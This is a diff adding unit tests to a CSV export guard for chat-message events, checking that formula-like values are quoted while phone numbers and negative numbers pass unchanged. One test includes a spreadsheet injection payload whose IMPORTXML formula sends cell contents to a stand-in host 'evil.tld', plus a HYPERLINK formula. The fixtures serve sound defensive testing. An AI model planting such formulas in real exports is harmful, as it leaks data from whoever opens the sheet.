@@ -74,6 +74,32 @@ test('free-text quotes a formula-like leading +/- but preserves a phone/number; 
   assert.equal(row[6], 'me');                         // benign id untouched
 });
 
+test('a formula that starts with a digit is quoted, unlike a phone number or a negative measurement', () => {
+  // Testing only the character right after the sign passed anything beginning with a digit, so a live
+  // formula like `-1+IMPORTXML(...)` reached the sheet unquoted. Excel and Sheets both parse a cell
+  // beginning `-1+` as a formula, and on the CSV round-trip this guard exists to defend, it fires.
+  const row = buildRow({
+    event: 'message:received', sessionId: 's1', timestamp: T, source: 'Engine',
+    data: { id: 'M9', from: 'x', to: 'y', chatId: 'c', type: 'text', fromMe: false, isGroup: false,
+            body: '-1+IMPORTXML("https://evil.tld/?d="&A2,"//a")',
+            contact: { pushName: '+1+HYPERLINK("http://evil","x")' } },
+  });
+  assert.equal(row[10], `'-1+IMPORTXML("https://evil.tld/?d="&A2,"//a")`, 'digit after the sign is not a pass');
+  assert.equal(row[7], `'+1+HYPERLINK("http://evil","x")`);
+});
+
+test('a phone number keeps its brackets and a message after a phone number stays readable', () => {
+  // The two shapes the digit rule exists to protect. Neither carries formula machinery, so neither is
+  // quoted, and an operator reading the sheet sees what the contact actually sent.
+  const row = buildRow({
+    event: 'message:received', sessionId: 's1', timestamp: T, source: 'Engine',
+    data: { id: 'M9', from: 'x', to: 'y', chatId: 'c', type: 'text', fromMe: false, isGroup: false,
+            body: '+62 (812) 3456-7890', contact: { pushName: '-1.5' } },
+  });
+  assert.equal(row[10], '+62 (812) 3456-7890');
+  assert.equal(row[7], '-1.5');
+});
+
 test('free-text keeps a negative number but quotes plus-then-space-then-formula', () => {
   const row = buildRow({
     event: 'message:received', sessionId: 's1', timestamp: T, source: 'Engine',
